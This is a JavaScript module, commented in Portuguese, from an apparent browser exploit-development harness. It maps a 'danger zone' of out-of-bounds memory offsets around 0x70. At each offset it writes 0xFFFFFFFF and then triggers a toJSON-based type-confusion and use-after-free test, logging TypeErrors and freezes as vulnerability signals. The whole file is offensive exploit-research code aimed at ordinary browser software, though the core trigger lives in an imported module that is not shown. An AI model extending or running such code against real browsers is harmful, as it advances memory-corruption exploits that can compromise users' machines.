// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeFocusedTestForTypeError, current_toJSON_call_count_for_TypeError_test } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs';
import { toHex } from '../utils.mjs';

// toJSON Minimalista para confirmar o ponto do TypeError
function toJSON_MinimalTriggerForCrash_MapZone() {
    current_toJSON_call_count_for_TypeError_test++; // Operação suspeita de causar o TypeError
    // Apenas uma canária de título para ver se entramos aqui antes do TypeError
    // Não usar logS3 aqui dentro para evitar que ele seja a causa.
    document.title = `toJSON_MapZone Call ${current_toJSON_call_count_for_TypeError_test}`;
    return { minimal_call_in_map_zone: current_toJSON_call_count_for_TypeError_test };
}

async function runMapDangerZoneAround0x70() {
    const FNAME_RUNNER = "runMapDangerZoneAround0x70";
    logS3(`==== INICIANDO Mapeamento da "Zona de Perigo" ao Redor de 0x70 ====`, 'test', FNAME_RUNNER);

    const baseOffsetOOB = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128);
    const originalCriticalOffset = baseOffsetOOB - 16; // 0x70

    // Definir a faixa de offsets para testar ao redor de 0x70
    // Ex: de 0x70 - 16 (0x60) até 0x70 + 16 (0x80), com passo de 2 ou 4.
    const offsetsToTest = [];
    for (let i = -16; i <= 16; i += 4) { // Testando de 0x60 a 0x80 com passo 4. Ajuste conforme necessário.
        offsetsToTest.push(originalCriticalOffset + i);
    }
    // Adicionar o offset 0x70 original para garantir que está incluído
    if (!offsetsToTest.includes(originalCriticalOffset)) {
        offsetsToTest.push(originalCriticalOffset);
        offsetsToTest.sort((a, b) => a - b); // Manter ordenado
    }
    
    logS3(`   Offsets a serem testados: ${offsetsToTest.map(o => toHex(o)).join(', ')}`, 'info', FNAME_RUNNER);

    const valueForCorruption = 0xFFFFFFFF; // Valor que sabemos ser problemático em 0x70

    for (const currentOffset of offsetsToTest) {
        if (currentOffset < 0) { // Evitar offsets negativos se não fizerem sentido para o buffer
            logS3(`\n--- Pulando offset negativo: ${toHex(currentOffset)} ---`, 'warn', FNAME_RUNNER);
            continue;
        }

        const testDescription = `MapZone_Offset_${toHex(currentOffset)}_Val_FFFF`;
        logS3(`\n--- Testando Offset: ${toHex(currentOffset)} com valor ${toHex(valueForCorruption)} ---`, 'subtest', FNAME_RUNNER);
        
        let result = await executeFocusedTestForTypeError(
            testDescription,
            toJSON_MinimalTriggerForCrash_MapZone,
            valueForCorruption,
            currentOffset // Passando o offset atual para o teste
        );

        if (result.errorOccurred && result.errorOccurred.name === 'TypeError') {
            logS3(`   RESULTADO para Offset ${toHex(currentOffset)}: ${result.errorOccurred.name} ocorreu como esperado. Chamadas toJSON: ${result.calls}`, "vuln", FNAME_RUNNER);
        } else if (result.errorOccurred) {
            logS3(`   RESULTADO para Offset ${toHex(currentOffset)}: Outro erro: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON: ${result.calls}`, "warn", FNAME_RUNNER);
        } else if (result.potentiallyCrashed) {
            logS3(`   RESULTADO para Offset ${toHex(currentOffset)}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
        } else {
            logS3(`   RESULTADO para Offset ${toHex(currentOffset)}: Completou SEM TypeError. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
        }
        logS3(`   Título da página ao final do teste para Offset ${toHex(currentOffset)}: ${document.title}`, "info");
        await PAUSE_S3(MEDIUM_PAUSE_S3);

        if (document.title.startsWith("CONGELOU?")) {
            logS3(`Congelamento detectado no offset ${toHex(currentOffset)}, interrompendo mapeamento.`, "error", FNAME_RUNNER);
            break; 
        }
    }
    logS3(`==== Mapeamento da "Zona de Perigo" CONCLUÍDO ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_MapDangerZone';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Mapeamento da "Zona de Perigo" ao Redor de 0x70 ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Mapeamento Zona Perigo";
    
    await runMapDangerZoneAround0x70();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Mapeamento da "Zona de Perigo") ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    if (document.title.startsWith("Iniciando") || document.title.includes("ERRO") || document.title.includes("CONGELOU?")) {
        // Manter
    } else {
        document.title = "Script 3 Concluído - Mapeamento Zona Perigo";
    }
}
